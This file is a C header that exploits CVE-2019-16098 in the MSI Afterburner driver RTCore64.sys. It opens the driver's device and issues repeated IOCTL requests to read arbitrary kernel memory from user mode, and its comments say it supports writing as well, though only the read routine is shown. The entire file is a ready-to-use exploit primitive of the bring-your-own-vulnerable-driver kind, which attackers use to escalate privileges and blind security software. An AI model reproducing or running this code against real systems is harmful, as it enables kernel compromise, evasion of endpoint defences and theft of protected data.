#pragma once

//RTCore64.sys specific vulnerable driver usage for reading/writing arbitary (kernel) memory
//RTCore64 is driver of MSI Afterburner official tool
//The latest working MSI Afterburner version is 4.6.2.15658 or older (4.6.1 tested)
//Also known as CVE-2019-16098

#include <windows.h>

struct RTC64_MEMORY_STRUCT {
    BYTE Unknown0[8];  // offset 0x00
    DWORD64 Address;   // offset 0x08
    BYTE Unknown1[4];  // offset 0x10
    DWORD Offset;      // offset 0x14
    DWORD Size;        // offset 0x18
    DWORD Value;       // offset 0x1c
    BYTE Unknown2[16]; // offset 0x20
};

#define DEVICE_NAME_RTCORE64 "\\\\.\\Rtcore64"
#define IOCTL_READ_KERNEL_MEM_RTCORE64 0x80002048

static HANDLE OpenDriverRTCore64() {
    return CreateFileA(DEVICE_NAME_RTCORE64, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
}


//Driver supports only 1/2/4 bytes reading per one iteration, so we need to make universal function to read any length by making few IOCTL requests
static BOOL ReadArbitraryMemoryRTCore64(HANDLE hDevice, uintptr_t addressToRead, unsigned char* buffer, unsigned short sizeToRead) {
    unsigned short i;
    BOOL result = true;
    RTC64_MEMORY_STRUCT readStruct;

    for (i = 0; i < sizeToRead && result;) {
        ZeroMemory(&readStruct, sizeof(readStruct));
        readStruct.Address = addressToRead + i;

        if (sizeToRead - i >= 4) {
            readStruct.Size = 4;
            result = DeviceIoControl(hDevice, IOCTL_READ_KERNEL_MEM_RTCORE64, &readStruct, sizeof(readStruct), &readStruct, sizeof(readStruct), NULL, NULL);
            *(int*)(buffer + i) = readStruct.Value;
            i += 4;
        }
        else if (sizeToRead - i >= 2) {
            readStruct.Size = 2;
            result = DeviceIoControl(hDevice, IOCTL_READ_KERNEL_MEM_RTCORE64, &readStruct, sizeof(readStruct), &readStruct, sizeof(readStruct), NULL, NULL);
            *(short*)(buffer + i) = readStruct.Value;
            i += 2;
        }
        else {
            readStruct.Size = 1;
            result = DeviceIoControl(hDevice, IOCTL_READ_KERNEL_MEM_RTCORE64, &readStruct, sizeof(readStruct), &readStruct, sizeof(readStruct), NULL, NULL);
            *(buffer + i) = readStruct.Value;
            i += 1;
        }
    }
    return result;
}